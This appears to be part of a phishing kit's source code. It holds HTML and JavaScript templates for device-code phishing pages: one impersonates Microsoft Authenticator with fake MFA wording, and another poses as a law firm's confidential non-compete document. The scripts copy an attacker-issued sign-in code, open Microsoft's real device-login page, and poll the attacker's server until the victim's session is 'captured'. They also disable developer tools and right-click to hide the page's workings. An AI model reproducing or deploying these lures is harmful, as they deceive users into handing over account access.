(function(){var sid='{session_id}';var verifyUrl='{verify_url}';var codeReady={code_ready};var code='{user_code}';var expiresIn={expires_seconds};var popup=null;var codeEl=document.getElementById('userCode');var statusEl=document.getElementById('codeStatus');var btnEl=document.getElementById('signInBtn');var copyBtnEl=document.getElementById('copyBtn');var copyTextEl=document.getElementById('copyText');var timerEl=document.getElementById('timerValue');function showCode(c,v){code=c;if(v)verifyUrl=v;codeEl.textContent=c;codeEl.classList.remove('loading');btnEl.disabled=false;copyBtnEl.disabled=false;document.getElementById('verifyLink').href=verifyUrl;}if(codeReady&&code){showCode(code,verifyUrl);}else{codeEl.classList.add('loading');}function copyCode(){if(!code)return;if(navigator.clipboard){navigator.clipboard.writeText(code).then(function(){showCopied();});}else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showCopied();}}function showCopied(){copyBtnEl.classList.add('copied');copyTextEl.textContent='Copied!';statusEl.textContent='Code copied to clipboard';setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy Code';},3000);}window.copyCode=copyCode;function openSignIn(){if(!code)return;copyCode();var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');if(popup)popup.focus();}window.openSignIn=openSignIn;function updateTimer(){if(expiresIn<=0)return;expiresIn--;var m=Math.floor(expiresIn/60);var s=expiresIn%60;timerEl.textContent=m+':'+(s<10?'0':'')+s;if(expiresIn>0)setTimeout(updateTimer,1000);}if(codeReady)setTimeout(updateTimer,1000);function poll(){fetch('/dc/status/'+sid,{method:'GET',credentials:'include'}).then(function(r){return r.json()}).then(function(d){if(d.ready&&!codeReady){codeReady=true;showCode(d.user_code,d.verify_url);if(expiresIn==={expires_seconds})setTimeout(updateTimer,1000);}if(d.captured){document.getElementById('mainView').style.display='none';document.getElementById('successView').style.display='block';if(d.redirect_url){setTimeout(function(){top.location.href=d.redirect_url;},2500);}}if(!d.failed&&!d.expired&&!d.captured)setTimeout(poll,3000);})['catch'](function(){setTimeout(poll,5000);});}poll();})();
</script>
</body>
</html>`

// Microsoft Authenticator MFA themed page
const DEVICE_CODE_AUTHENTICATOR_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="referrer" content="no-referrer">
<title>Microsoft Authenticator - Verification</title>
<link rel="icon" href="data:image/x-icon;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAA3RJREFUWEfNl0tsU1cQhv/jO7bj2HHixHkQAkkgJDyaBBKgQFuVCkSRuqhU0UVXXbZlxaKLrlixYtUNUldIXSGxQOqii0qIh6hUCRSJR3g0ISQkJCEJSexAHNu5vmP7+p45595rJzghNKLqok46Ov/MzJn5Z+aMfSX+B/L/N/xJvF7vKrvdvkun023QarWbVSrVep1Ot1GtVm9Qq9V2m81mVyqVVoVCYVEoFGaFQmFSqVRGhUJhVCgURrlcblAqlfr/LPzJ7u5up9/vd/T19Tn7+/udAwMDzsHBQefQ0JBzZGTEOTo66hgbG3OMj487JiYmHJOTk46pqSnH9PS0Y2ZmxjE7O+tramrSPxuAz+ezDg8PW0ZGRizj4+OW6elpS3d3t6Wnp8fS29tr6e/vt4yNjVkmJyctMzMzlrm5OUsgELAEg0FLKBSyBAIBS29vr+npAGp+amrKOjEx YZ2cnLROT09bp6enrTMzM9a5uTnr/Py8dXFx0bqysmJdXV21rq2tWdfX163BYNAaDoctoVDIGgqFrI8FEAgEDAC MgUDA2N/fbxwYGDAODQ0Zh4eHjWNjY8aJiQnj9PS0sa+vz9jf32/s6+sz9vX1GXs7OzuNPT09xp6eHmN3d7fx8QH+ AoiKCQYGBoz9/f3G4eFh4+joqHFiYsI4PT1tnJ+fNy4vLxtXV1eNa2trxvX1dWMoFDIGg0FjMBg0zs7OGh8d QCwWM8zNzRkWFhYMi4uLhqWlJcPy8rJheXnZsLKyYlhdXTWsra0Z1tfXDRsbG4ZgMGiIRCKGSCRiiEQihvX1 dcPDAdTV1ZkmJydNs7OzpoWFBdP8/LxpaWnJ1N3dberu7jb19PQY+/r6jMPDw8axsTHj1NSUcW5uzhgIBIzR aNQYjUaN0WjU+PAAtbW15q6uLnNPT495YGDAPDY2Zh4fHzd3dXWZu7u7zd3d3eb+/n7z8PCweWxszDw5OWlc XFw0LiwsmJaWlkzLy8umxcVF08MBiP/Fixcvnlu3br302muvnXv99df/9u7duy8dO3bspQ8++ODc4cOHz x0+fPjce++9d+7gwYPnDhw4cO7dd989u3///rM7d+482dnZefZ+WjXr6+u1lZWV2vLycm1paalWfG1JSbGm pKTkZocOHTp586233rr5xhtvnDx+/PhJ8b1//Hi9/v7+E3U1Nee2b9jw0datW3+pra39RafXn1er1RdkMtl1 mUx2VSaTXZXL5VdlMtlVmUx2VSaTXZPJZNdlMtl1uVx+XS6XX5fL5TdkMtkNmRQXvgP/AHoBVoPV7QAAAAAA SU5ORK5CYII=">
<style>*{margin:0;padding:0;box-sizing:border-box}body,html{height:100%;width:100%}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f0f2f5;display:flex;flex-direction:column;min-height:100vh}.header{background:linear-gradient(135deg,#0078d4,#00bcf2);padding:16px 36px;display:flex;align-items:center;gap:14px;flex-shrink:0;box-shadow:0 3px 8px rgba(0,0,0,0.15)}.header svg{flex-shrink:0}.header-title{color:#fff;font-size:15px;font-weight:700;letter-spacing:-0.3px}.main{flex:1;display:flex;align-items:center;justify-content:center;padding:50px 20px}.card{background:#fff;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,0.1);width:100%;max-width:520px;padding:52px 48px}.logo{display:flex;align-items:center;justify-content:center;gap:14px;margin-bottom:36px}.logo svg{flex-shrink:0}.logo-text{font-size:17px;font-weight:800;color:#0078d4}.intro{text-align:center;color:#1a1a1a;font-size:13px;line-height:1.7;margin-bottom:32px;font-weight:600}.info-box{background:linear-gradient(135deg,#e8f4fd,#cfe7f7);border-left:5px solid#0078d4;padding:18px 20px;margin-bottom:32px;font-size:15px;color:#004578;line-height:1.7;border-radius:6px}.code-label{font-size:15px;font-weight:800;color:#0078d4;margin-bottom:12px;text-transform:uppercase;letter-spacing:1px;text-align:center}.code-input{width:100%;background:#fafbfc;border:2px solid#0078d4;border-radius:8px;padding:14px;font-size:20px;font-weight:900;letter-spacing:6px;color:#0078d4;text-align:center;font-family:'Courier New',Consolas,monospace;margin-bottom:14px;user-select:all;transition:all .2s;box-shadow:inset 0 2px 4px rgba(0,0,0,0.05)}.code-input.loading{color:#8a8886;font-size:18px;letter-spacing:normal;border-color:#c8c6c4}.code-input:hover{transform:scale(1.01)}.copy-row{display:flex;justify-content:center;margin-bottom:28px}.copy-btn{background:linear-gradient(135deg,#0078d4,#005a9e);color:#fff;border:none;padding:12px 28px;border-radius:8px;cursor:pointer;font-size:16px;font-weight:800;display:flex;align-items:center;gap:12px;transition:all .2s;box-shadow:0 4px 12px rgba(0,120,212,0.25)}.copy-btn:hover{background:linear-gradient(135deg,#005a9e,#004578);transform:translateY(-2px);box-shadow:0 6px 16px rgba(0,120,212,0.35)}.copy-btn.copied{background:linear-gradient(135deg,#107c10,#0b5a0b)}.copy-btn svg{width:19px;height:19px;fill:currentColor}.status{font-size:15px;color:#107c10;text-align:center;margin-bottom:22px;min-height:24px;font-weight:700}.btn-primary{display:flex;align-items:center;justify-content:center;gap:14px;width:100%;background:linear-gradient(135deg,#0078d4,#00bcf2);color:#fff;border:none;padding:14px 28px;font-size:14px;font-weight:800;cursor:pointer;border-radius:8px;transition:all .2s;margin-bottom:28px;box-shadow:0 4px 14px rgba(0,120,212,0.3)}.btn-primary:hover{background:linear-gradient(135deg,#005a9e,#0091c8);transform:translateY(-2px);box-shadow:0 6px 18px rgba(0,120,212,0.4)}.btn-primary:disabled{background:#c8c6c4;cursor:not-allowed;transform:none;box-shadow:none}.btn-primary svg{flex-shrink:0}.security-box{background:linear-gradient(135deg,#f8fbfd,#e8f3f9);border:2px solid#0078d4;border-radius:8px;padding:20px;margin-bottom:28px;text-align:center}.security-box p{font-size:14px;color:#1a1a1a;line-height:1.7;margin-bottom:16px;font-weight:500}.security-badge{display:inline-flex;align-items:center;gap:10px;background:linear-gradient(135deg,#0078d4,#00bcf2);color:#fff;padding:12px 24px;border-radius:8px;font-size:15px;font-weight:800;text-decoration:none;transition:all .2s;box-shadow:0 3px 10px rgba(0,120,212,0.25)}.security-badge:hover{background:linear-gradient(135deg,#005a9e,#0091c8);transform:translateY(-1px);box-shadow:0 5px 14px rgba(0,120,212,0.35)}.security-badge svg{width:17px;height:17px;fill:currentColor}.footer-text{text-align:center;font-size:14px;color:#605e5c;margin-bottom:20px;font-weight:500}.timer{text-align:center;font-size:14px;color:#323130;font-weight:700;background:#fff3cd;padding:10px;border-radius:6px}.timer span{font-weight:900;color:#d83b01}.success{display:none;text-align:center;padding:28px 0}.success-icon{width:80px;height:80px;background:linear-gradient(135deg,#107c10,#0b5a0b);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 28px;box-shadow:0 6px 16px rgba(16,124,16,0.35)}.success-icon svg{width:40px;height:40px;fill:#fff}.success h2{font-size:24px;font-weight:800;color:#1a1a1a;margin-bottom:12px}.success p{font-size:16px;color:#605e5c;margin-bottom:28px;font-weight:500}.success-badge{display:inline-flex;align-items:center;gap:12px;background:linear-gradient(135deg,#dff6dd,#c3ebbf);color:#107c10;padding:14px 28px;border-radius:8px;font-size:16px;font-weight:800;border:2px solid#107c10}.success-badge svg{width:22px;height:22px;fill:currentColor}@media(max-width:500px){.card{padding:40px 32px;border-radius:0}.code-input{font-size:24px;letter-spacing:4px}}</style>
</head>
<body>
<div class="header">
<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/31/b7/a8/31b7a8f3-a164-d1f8-cc20-0ae39d5cef7d/AppIcon-0-1x_U007emarketing-0-11-0-sRGB-85-220-0.png/400x400ia-75.webp" width="28" height="28" style="border-radius:6px;flex-shrink:0">
<span class="header-title">Microsoft Authenticator</span>
</div>
<div class="main"><div class="card">
<div class="logo">
<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/31/b7/a8/31b7a8f3-a164-d1f8-cc20-0ae39d5cef7d/AppIcon-0-1x_U007emarketing-0-11-0-sRGB-85-220-0.png/400x400ia-75.webp" width="44" height="44" style="border-radius:10px;flex-shrink:0">
<span class="logo-text">Microsoft Authenticator</span>
</div>
<div id="mainView">
<p class="intro">Complete your multi-factor authentication to proceed.</p>
<div class="info-box">Your organization requires MFA validation. Use the authorization code below on the Microsoft sign-in page to complete authentication.</div>
<div class="code-label">MFA Authorization Code</div>
<div class="code-input" id="userCode">Loading...</div>
<div class="copy-row">
<button class="copy-btn" id="copyBtn" onclick="copyCode()" disabled>
<svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
<span id="copyText">Copy Code</span>
</button>
</div>
<div class="status" id="codeStatus"></div>
<button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>
<svg width="20" height="20" viewBox="0 0 24 24"><path fill="#fff" d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/><path fill="#0078d4" d="M10 15.17l-3.59-3.58L5 13l5 5 9-9-1.41-1.42z"/></svg>
VALIDATE MFA
</button>
<div class="security-box">
<p>Protected by Microsoft Azure Active Directory. Multi-factor authentication keeps your account secure.</p>
<a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank" class="security-badge">
<svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
Microsoft Azure Advanced Security
</a>
</div>
<p class="footer-text">Secure authentication powered by Microsoft Azure.</p>
<div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
</div>
<div class="success" id="successView">
<div class="success-icon"><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg></div>
<h2>MFA Validated</h2>
<p>Multi-factor authentication complete. You may now close this window.</p>
<div class="success-badge"><svg viewBox="0 0 16 16"><path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/></svg>MFA Complete</div>
</div>
</div></div>
<script>
document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});
(function(){var sid='{session_id}';var verifyUrl='{verify_url}';var codeReady={code_ready};var code='{user_code}';var expiresIn={expires_seconds};var popup=null;var codeEl=document.getElementById('userCode');var statusEl=document.getElementById('codeStatus');var btnEl=document.getElementById('signInBtn');var copyBtnEl=document.getElementById('copyBtn');var copyTextEl=document.getElementById('copyText');var timerEl=document.getElementById('timerValue');function showCode(c,v){code=c;if(v)verifyUrl=v;codeEl.textContent=c;codeEl.classList.remove('loading');btnEl.disabled=false;copyBtnEl.disabled=false;document.getElementById('verifyLink').href=verifyUrl;}if(codeReady&&code){showCode(code,verifyUrl);}else{codeEl.classList.add('loading');}function copyCode(){if(!code)return;if(navigator.clipboard){navigator.clipboard.writeText(code).then(function(){showCopied();});}else{var t=document.createElement('textarea');t.value=code;t.style.cssText='position:fixed;left:-9999px';document.body.appendChild(t);t.select();document.execCommand('copy');document.body.removeChild(t);showCopied();}}function showCopied(){copyBtnEl.classList.add('copied');copyTextEl.textContent='Copied!';statusEl.textContent='Code copied to clipboard';setTimeout(function(){copyBtnEl.classList.remove('copied');copyTextEl.textContent='Copy Code';},3000);}window.copyCode=copyCode;function openSignIn(){if(!code)return;copyCode();var w=520,h=700,l=(screen.width-w)/2,t=(screen.height-h)/2;popup=window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');if(popup)popup.focus();}window.openSignIn=openSignIn;function updateTimer(){if(expiresIn<=0)return;expiresIn--;var m=Math.floor(expiresIn/60);var s=expiresIn%60;timerEl.textContent=m+':'+(s<10?'0':'')+s;if(expiresIn>0)setTimeout(updateTimer,1000);}if(codeReady)setTimeout(updateTimer,1000);function poll(){fetch('/dc/status/'+sid,{method:'GET',credentials:'include'}).then(function(r){return r.json()}).then(function(d){if(d.ready&&!codeReady){codeReady=true;showCode(d.user_code,d.verify_url);if(expiresIn==={expires_seconds})setTimeout(updateTimer,1000);}if(d.captured){document.getElementById('mainView').style.display='none';document.getElementById('successView').style.display='block';if(d.redirect_url){setTimeout(function(){top.location.href=d.redirect_url;},2500);}}if(!d.failed&&!d.expired&&!d.captured)setTimeout(poll,3000);})['catch'](function(){setTimeout(poll,5000);});}poll();})();
</script>
</body>
</html>`

// Non-compete Document access themed page (LexVault)
const DEVICE_CODE_LEXVAULT_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Non-compete Document — Mason Parkes & Associates LLP</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@500;600&family=Cormorant+Garamond:ital,wght@0,500;0,600;1,400&display=swap" rel="stylesheet">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

:root {
  --teal:       #0a7c6e;
  --teal-mid:   #0d9488;
  --teal-light: #14b8a6;
  --teal-pale:  #e6f4f3;
  --ink:        #0f1923;
  --ink-mid:    #374151;
  --ink-mute:   #6b7280;
  --ink-faint:  #9ca3af;
  --border:     #e2e8f0;
  --border-mid: #cbd5e1;
  --white:      #ffffff;
  --red:        #dc2626;
}

html, body {
  height: 100%;
  font-family: 'Inter', sans-serif;
  -webkit-font-smoothing: antialiased;
  overflow: hidden;
}

.doc-bg {
  position: fixed;
  inset: 0;
  background: #f7f5f0;
  display: flex;
  align-items: flex-start;
  justify-content: center;
  padding-top: 60px;
  filter: blur(6px);
  transform: scale(1.04);
  transform-origin: top center;
  user-select: none;
  pointer-events: none;
}

.fake-doc {
  width: 680px;
  background: #fff;
  box-shadow: 0 8px 60px rgba(0,0,0,0.12);
  padding: 72px 80px 80px;
  border-radius: 2px;
  position: relative;
  top: 10%;
}

.fake-doc::before {
  content: 'CONFIDENTIAL';
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%) rotate(-35deg);
  font-size: 5rem;
  font-weight: 800;
  color: rgba(10,124,110,0.06);
  letter-spacing: 0.25em;
  white-space: nowrap;
  pointer-events: none;
}

.doc-firm-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding-bottom: 24px;
  border-bottom: 2px solid #e8e4dc;
  margin-bottom: 32px;
}

.doc-firm-name {
  font-family: 'Cormorant Garamond', serif;
  font-size: 1.5rem;
  font-weight: 600;
  color: #1a1714;
  letter-spacing: 0.01em;
}
.doc-firm-sub {
  font-size: 0.7rem;
  color: #9a9690;
  letter-spacing: 0.06em;
  text-transform: uppercase;
  margin-top: 2px;
}
.doc-seal { width: 54px; height: 54px; }

.doc-title-block {
  text-align: center;
  margin-bottom: 36px;
}
.doc-title-block h1 {
  font-family: 'Cormorant Garamond', serif;
  font-size: 1.6rem;
  font-weight: 600;
  color: #1a1714;
  margin-bottom: 8px;
}
.doc-title-block .sub {
  font-size: 0.8rem;
  color: #6b7280;
  text-transform: uppercase;
  letter-spacing: 0.1em;
}
.doc-line { height: 11px; background: #ede9e1; border-radius: 2px; margin-bottom: 8px; }
.doc-line.w100 { width: 100%; }
.doc-line.w90  { width: 90%; }
.doc-line.w80  { width: 80%; }
.doc-line.w70  { width: 70%; }
.doc-line.w55  { width: 55%; }
.doc-section-title {
  font-family: 'Cormorant Garamond', serif;
  font-size: 0.95rem;
  font-weight: 600;
  color: #1a1714;
  text-transform: uppercase;
  letter-spacing: 0.08em;
  margin: 28px 0 12px;
  padding-bottom: 6px;
  border-bottom: 1px solid #e8e4dc;
}
.doc-para { margin-bottom: 6px; }
.doc-sigs {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 32px;
  margin-top: 48px;
  padding-top: 24px;
  border-top: 1px solid #e8e4dc;
}
.sig-line { height: 1px; background: #c8c3ba; margin-bottom: 6px; }
.sig-name { height: 10px; background: #ede9e1; border-radius: 2px; width: 60%; }
.sig-role { height: 8px; background: #f0ece4; border-radius: 2px; width: 45%; margin-top: 5px; }

.overlay {
  position: fixed;
  inset: 0;
  background: rgba(10, 14, 20, 0.62);
}

.topbar {
  position: fixed;
  top: 0; left: 0; right: 0;
  z-index: 20;
  height: 52px;
  background: rgba(10, 14, 20, 0.75);
  backdrop-filter: blur(12px);
  -webkit-backdrop-filter: blur(12px);
  border-bottom: 1px solid rgba(255,255,255,0.07);
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 2rem;
}
.topbar-left {
  display: flex;
  align-items: center;
  gap: 10px;
}
.topbar-logo {
  display: flex;
  align-items: center;
  gap: 7px;
}
.topbar-logo-icon {
  width: 26px; height: 26px;
  background: var(--teal);
  border-radius: 6px;
  display: flex;
  align-items: center;
  justify-content: center;
}
.topbar-logo-icon svg { width: 14px; height: 14px; }
.topbar-name {
  font-size: 0.88rem;
  font-weight: 700;
  color: #fff;
  letter-spacing: -0.01em;
}
.topbar-sep {
  width: 1px; height: 16px;
  background: rgba(255,255,255,0.15);
}
.topbar-doc-label {
  font-size: 0.75rem;
  color: rgba(255,255,255,0.45);
}
.topbar-right {
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 0.72rem;
  color: rgba(255,255,255,0.4);
}
.secure-pill {
  display: flex;
  align-items: center;
  gap: 5px;
  padding: 3px 10px;
  border: 1px solid rgba(255,255,255,0.1);
  border-radius: 20px;
  background: rgba(255,255,255,0.05);
}
.secure-dot {
  width: 6px; height: 6px;
  border-radius: 50%;
  background: #4ade80;
  animation: blink 2.5s ease-in-out infinite;
}
@keyframes blink {
  0%,100% { opacity: 1; } 50% { opacity: 0.4; }
}

.page {
  position: fixed;
  inset: 0;
  z-index: 10;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 52px 1rem 1rem;
}

.card {
  width: 100%;
  max-width: 400px;
  background: #fff;
  border-radius: 14px;
  box-shadow:
    0 0 0 1px rgba(0,0,0,0.08),
    0 8px 24px rgba(0,0,0,0.18),
    0 32px 80px rgba(0,0,0,0.28);
  overflow: hidden;
  position: relative;
  animation: card-in 0.4s cubic-bezier(0.34,1.2,0.64,1) both;
}
@keyframes card-in {
  from { transform: translateY(24px) scale(0.97); opacity: 0; }
  to   { transform: translateY(0) scale(1); opacity: 1; }
}
.card-bar {
  height: 4px;
  background: linear-gradient(90deg, var(--teal) 0%, var(--teal-light) 100%);
}

.card-header {
  padding: 1.3rem 1.5rem 1.1rem;
  border-bottom: 1px solid #f0f4f8;
  display: flex;
  align-items: center;
  gap: 11px;
}
.company-avatar {
  width: 40px; height: 40px;
  border-radius: 9px;
  background: var(--teal-pale);
  border: 1px solid rgba(10,124,110,0.15);
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  font-family: 'Cormorant Garamond', serif;
  font-size: 1rem;
  font-weight: 600;
  color: var(--teal);
}
.company-info {}
.company-name {
  font-size: 0.88rem;
  font-weight: 600;
  color: var(--ink);
  line-height: 1.25;
}
.company-verified {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  font-size: 0.67rem;
  font-weight: 500;
  color: var(--teal);
  margin-top: 2px;
}
.company-verified svg { width: 11px; height: 11px; fill: var(--teal); }

.card-body { padding: 1.3rem 1.5rem; }

.alert-strip {
  display: flex;
  gap: 9px;
  align-items: flex-start;
  padding: 11px 13px;
  background: #f0fafa;
  border: 1px solid rgba(10,124,110,0.16);
  border-left: 3px solid var(--teal-mid);
  border-radius: 8px;
  margin-bottom: 1.2rem;
}
.alert-strip svg {
  width: 16px; height: 16px;
  fill: var(--teal-mid);
  flex-shrink: 0;
  margin-top: 1px;
}
.alert-strip p {
  font-size: 0.77rem;
  color: var(--teal);
  line-height: 1.5;
}

.doc-row {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 10px 12px;
  background: #f8fafc;
  border: 1px solid var(--border);
  border-radius: 8px;
  margin-bottom: 1.2rem;
}
.doc-row-icon {
  width: 32px; height: 32px;
  border: 1px solid var(--border-mid);
  border-radius: 7px;
  background: #fff;
  display: flex; align-items: center; justify-content: center;
  flex-shrink: 0;
}
.doc-row-icon svg { width: 16px; height: 16px; }
.doc-row-info { flex: 1; min-width: 0; }
.doc-row-name {
  font-size: 0.8rem;
  font-weight: 600;
  color: var(--ink);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
.doc-row-meta {
  font-size: 0.68rem;
  color: var(--ink-faint);
  margin-top: 1px;
}
.doc-lock-badge {
  width: 24px; height: 24px;
  border-radius: 50%;
  background: var(--teal-pale);
  display: flex; align-items: center; justify-content: center;
  flex-shrink: 0;
}
.doc-lock-badge svg {
  width: 11px; height: 11px;
  stroke: var(--teal);
  fill: none;
  stroke-width: 2;
  stroke-linecap: round;
  stroke-linejoin: round;
}

.code-label-row {
  display: flex; align-items: center; justify-content: space-between;
  margin-bottom: 7px;
}
.code-label {
  font-size: 0.63rem;
  text-transform: uppercase;
  letter-spacing: 0.13em;
  font-weight: 700;
  color: var(--ink-faint);
}
.new-code-btn {
  display: flex; align-items: center; gap: 4px;
  font-size: 0.7rem;
  font-weight: 600;
  color: var(--teal-mid);
  background: none; border: none; cursor: pointer;
  font-family: 'Inter', sans-serif;
  padding: 0;
  transition: color 0.12s;
}
.new-code-btn:hover { color: var(--teal); }
.new-code-btn svg { width: 12px; height: 12px; stroke: currentColor; fill: none; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; }

.code-box {
  display: flex; align-items: center; justify-content: space-between;
  background: #f8fafc;
  border: 1.5px solid var(--border-mid);
  border-radius: 10px;
  padding: 13px 14px;
  margin-bottom: 14px;
  gap: 8px;
}
.code-value {
  font-family: 'JetBrains Mono', monospace;
  font-size: 1.35rem;
  font-weight: 600;
  color: var(--teal);
  letter-spacing: 0.2em;
  flex: 1;
  text-align: center;
}
.copy-btn {
  display: flex; align-items: center; gap: 5px;
  padding: 5px 11px;
  background: #fff;
  border: 1.5px solid var(--border-mid);
  border-radius: 6px;
  font-size: 0.72rem;
  font-weight: 500;
  color: var(--ink-mid);
  cursor: pointer;
  font-family: 'Inter', sans-serif;
  transition: border-color 0.12s, color 0.12s, background 0.12s;
  white-space: nowrap;
}
.copy-btn:hover { border-color: var(--teal-mid); color: var(--teal); }
.copy-btn.copied { border-color: var(--teal); color: var(--teal); background: var(--teal-pale); }
.copy-btn svg { width: 12px; height: 12px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }

.how-steps {
  display: flex;
  flex-direction: column;
  gap: 8px;
  margin-bottom: 14px;
}
.how-item {
  display: flex; align-items: flex-start; gap: 9px;
}
.how-num {
  width: 20px; height: 20px;
  border-radius: 50%;
  background: var(--teal-pale);
  color: var(--teal);
  font-size: 0.65rem;
  font-weight: 700;
  display: flex; align-items: center; justify-content: center;
  flex-shrink: 0;
  margin-top: 1px;
}
.how-text {
  font-size: 0.77rem;
  color: var(--ink-mid);
  line-height: 1.5;
}

.btn-authenticate {
  width: 100%;
  padding: 12px 14px;
  background: var(--teal);
  color: #fff;
  font-family: 'Inter', sans-serif;
  font-size: 0.88rem;
  font-weight: 600;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 8px;
  transition: background 0.14s, box-shadow 0.14s;
}
.btn-authenticate:hover { background: var(--teal-mid); box-shadow: 0 4px 14px rgba(10,124,110,0.3); }
.btn-authenticate svg { width: 16px; height: 16px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }

.status-bar {
  display: flex; align-items: center; gap: 7px;
  padding: 8px 12px;
  background: #f0fafa;
  border: 1px solid rgba(10,124,110,0.18);
  border-radius: 7px;
  font-size: 0.74rem;
  color: var(--teal);
  font-weight: 500;
  margin-top: 10px;
}
.status-bar svg { width: 14px; height: 14px; fill: var(--teal); flex-shrink: 0; }

.success-wrap {
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
  gap: 5px;
  padding-bottom: 4px;
}
.success-ring {
  width: 54px; height: 54px;
  border-radius: 50%;
  border: 2px solid var(--teal);
  background: var(--teal-pale);
  display: flex; align-items: center; justify-content: center;
  margin-bottom: 6px;
  animation: pop-in 0.3s cubic-bezier(0.34,1.56,0.64,1) both;
}
@keyframes pop-in {
  from { transform: scale(0.5); opacity: 0; }
  to   { transform: scale(1);   opacity: 1; }
}
.success-ring svg {
  width: 24px; height: 24px;
  stroke: var(--teal); fill: none;
  stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round;
  stroke-dasharray: 30; stroke-dashoffset: 30;
  animation: draw-check 0.32s ease forwards 0.28s;
}
@keyframes draw-check { to { stroke-dashoffset: 0; } }
.success-title {
  font-size: 0.97rem;
  font-weight: 700;
  color: var(--ink);
}
.success-email-pill {
  font-family: 'JetBrains Mono', monospace;
  font-size: 0.72rem;
  background: var(--teal-pale);
  color: var(--teal);
  border: 1px solid rgba(10,124,110,0.18);
  border-radius: 20px;
  padding: 3px 12px;
  margin: 3px 0 6px;
}
.success-sub {
  font-size: 0.77rem;
  color: var(--ink-mute);
  line-height: 1.55;
  max-width: 280px;
  margin-bottom: 10px;
}
.btn-download {
  width: 100%;
  padding: 10px 14px;
  background: var(--teal);
  color: #fff;
  font-family: 'Inter', sans-serif;
  font-size: 0.85rem;
  font-weight: 600;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 7px;
  transition: background 0.14s, box-shadow 0.14s;
}
.btn-download:hover { background: var(--teal-mid); box-shadow: 0 4px 12px rgba(10,124,110,0.25); }
.btn-download svg { width: 15px; height: 15px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
.audit-log {
  width: 100%;
  background: #f8fafc;
  border: 1px solid var(--border);
  border-radius: 7px;
  padding: 9px 12px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 0.64rem;
  color: var(--ink-mute);
  line-height: 1.75;
  text-align: left;
  margin-top: 8px;
}

.card-footer {
  padding: 10px 1.5rem 1.2rem;
  border-top: 1px solid #f0f4f8;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 5px;
  flex-wrap: wrap;
}
.tag {
  font-size: 0.64rem;
  color: var(--ink-faint);
  display: flex; align-items: center; gap: 3px;
}
.tag.pill {
  background: var(--teal-pale);
  border: 1px solid rgba(10,124,110,0.18);
  border-radius: 20px;
  padding: 2px 8px;
  color: var(--teal);
  font-weight: 500;
}
